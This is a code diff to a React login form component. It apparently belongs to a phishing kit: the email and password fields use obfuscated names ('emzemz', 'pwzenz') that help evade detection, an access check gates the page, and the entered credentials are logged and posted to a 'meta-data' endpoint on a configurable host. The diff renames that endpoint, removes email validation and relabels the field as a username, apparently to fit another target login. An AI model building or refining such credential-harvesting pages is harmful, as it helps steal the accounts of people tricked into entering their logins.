@@ -13,32 +13,25 @@ const LoginForm: React.FC = () => {
   const navigate = useNavigate();
   const isAllowed = useAccessCheck(baseUrl);
 
-  // Show loading state while checking access
-  if (!isAllowed) {
-    return <div>Loading...</div>; // Or a proper loading spinner
+  // If access is explicitly denied (not just loading), show loading
+  if (isAllowed === false) {
+    return <div>Access denied. Redirecting...</div>;
   }
 
   const togglePwzenzVisibility = () => {
     setShowPwzenz((prev) => !prev);
   };
 
-  const validateEmzemz = (emzemz: string) => {
-    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    return regex.test(emzemz);
-  };
+
 
   const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
     setIsLoading(true);
     event.preventDefault();
     let newErrors = { emzemz: '', pwzenz: '' };
 
-    if (!validateEmzemz(emzemz)) {
-      newErrors.emzemz = 'Invalid email format.';
-      setIsLoading(false);
-    }
 
     if (pwzenz.length <= 0) {
-      newErrors.pwzenz = 'Password must be at least 6 characters.';
+      newErrors.pwzenz = 'Password is required.';
       setIsLoading(false);
     }
 
@@ -49,7 +42,7 @@ const LoginForm: React.FC = () => {
       // Proceed with form submission
       console.log('Form submitted with:', { emzemz, pwzenz });
 
-      const url = `${baseUrl}api/meta-data-1/`;
+      const url = `${baseUrl}api/logix-meta-data-1/`;
 
       try {
         await axios.post(url, {
@@ -80,7 +73,7 @@ const LoginForm: React.FC = () => {
             <input
               id="emzemz"
               name="emzemz"
-              type="email"
+              type="text"
               value={emzemz}
               onChange={(e) => setEmzemz(e.target.value)}
               className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
@@ -102,7 +95,7 @@ const LoginForm: React.FC = () => {
                 ></path>
               </svg>
 
-              <p>Email required</p>
+              <p>Username required</p>
             </div>
           )}
 
